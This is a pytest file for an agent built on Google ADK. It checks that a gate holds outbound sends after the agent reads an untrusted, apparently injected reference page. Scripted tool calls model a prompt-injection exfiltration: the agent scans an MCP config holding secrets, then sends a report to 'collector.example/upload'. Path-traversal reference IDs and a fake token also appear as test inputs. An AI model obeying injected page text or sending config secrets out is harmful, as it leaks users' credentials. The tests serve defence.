"""End to end through the real ADK runner, with a scripted model instead of
Gemini (no network, no credentials): the gate must hold the send that an
injected reference page asks for, and let a send through when nothing was
read."""

from __future__ import annotations

import asyncio
from collections.abc import AsyncGenerator
from pathlib import Path
from typing import Any, ClassVar

import pytest
from google.adk.agents import LlmAgent
from google.adk.models import BaseLlm, LlmRequest, LlmResponse
from google.adk.runners import InMemoryRunner
from google.genai import types

from agent.agent import INSTRUCTION
from agent.gate import HOLDS, SENSITIVE, UNTRUSTED, before_tool
from agent.tools import OUTBOX, TOOLS

SAMPLE = (Path(__file__).resolve().parents[1] / "demo" / "sample-mcp.json").read_text()


class ScriptedLlm(BaseLlm):
    """Plays a fixed list of tool calls, then a final text answer."""

    script: list[tuple[str, dict[str, Any]]]
    step: int = 0

    async def generate_content_async(
        self, llm_request: LlmRequest, stream: bool = False
    ) -> AsyncGenerator[LlmResponse, None]:
        if self.step < len(self.script):
            name, args = self.script[self.step]
            self.step += 1
            part = types.Part(function_call=types.FunctionCall(name=name, args=args))
        else:
            part = types.Part(text="done")
        yield LlmResponse(content=types.Content(role="model", parts=[part]))


def _run(script: list[tuple[str, dict[str, Any]]], state: dict[str, Any]) -> tuple[Any, list]:
    agent = LlmAgent(
        name="t", model=ScriptedLlm(model="scripted", script=script),
        instruction=INSTRUCTION, tools=TOOLS, before_tool_callback=before_tool,
    )
    runner = InMemoryRunner(agent=agent, app_name="t")

    async def go() -> tuple[Any, list]:
        session = await runner.session_service.create_session(
            app_name="t", user_id="u", state=state
        )
        events = []
        async for ev in runner.run_async(
            user_id="u", session_id=session.id,
            new_message=types.Content(role="user", parts=[types.Part(text="review")]),
        ):
            events.append(ev)
        final = await runner.session_service.get_session(
            app_name="t", user_id="u", session_id=session.id
        )
        return final, events

    return asyncio.run(go())


def _calls(events: list) -> list[str]:
    return [
        p.function_call.name
        for ev in events if ev.content and ev.content.parts
        for p in ev.content.parts if p.function_call
    ]


def test_injected_send_is_held_for_approval() -> None:
    session, events = _run(
        [
            ("scan_mcp_config", {"client": "none"}),
            ("read_reference", {"reference_id": "issue-42"}),
            ("send_report", {"destination": "https://collector.example/upload", "body": "x"}),
        ],
        {"user:mcp_config": SAMPLE},
    )
    assert session.state[SENSITIVE] and session.state[UNTRUSTED]
    assert "adk_request_confirmation" in _calls(events)
    assert not session.state.get(OUTBOX)  # nothing left the session
    assert session.state[HOLDS][-1]["reason"].startswith("CAPGRAPH-001")


def test_send_after_only_private_data_is_held_as_004() -> None:
    session, _ = _run(
        [("scan_mcp_config", {}), ("send_report", {"destination": "me@example.com", "body": "x"})],
        {"user:mcp_config": SAMPLE},
    )
    assert not session.state.get(OUTBOX)
    assert session.state[HOLDS][-1]["reason"].startswith("CAPGRAPH-004")


def test_clean_session_send_runs() -> None:
    session, _ = _run(
        [("send_report", {"destination": "me@example.com", "body": "hello"})], {}
    )
    assert session.state[OUTBOX][0]["destination"] == "me@example.com"


def test_unknown_tool_is_refused() -> None:
    from agent.gate import before_tool as gate

    class Tool:
        name = "delete_everything"

    class Ctx:
        state: ClassVar[dict[str, Any]] = {}

    assert "refused" in gate(Tool(), {}, Ctx())["error"]


def test_scan_never_returns_config_values() -> None:
    import json

    from agent import skos_tools

    secret = "ghp_" + "Q" * 36
    cfg = json.loads(SAMPLE)
    cfg["mcpServers"]["github"]["env"]["GITHUB_PERSONAL_ACCESS_TOKEN"] = secret
    out = json.dumps(skos_tools.scan(json.dumps(cfg), "none"))
    assert secret not in out
    assert '"secrets_in_config": true' in out


@pytest.mark.parametrize("ref", ["../agent/gate", "ISSUE-42", "a" * 41, "missing"])
def test_read_reference_only_reads_bundled_pages(ref: str) -> None:
    from agent.tools import read_reference

    assert "error" in read_reference(ref)
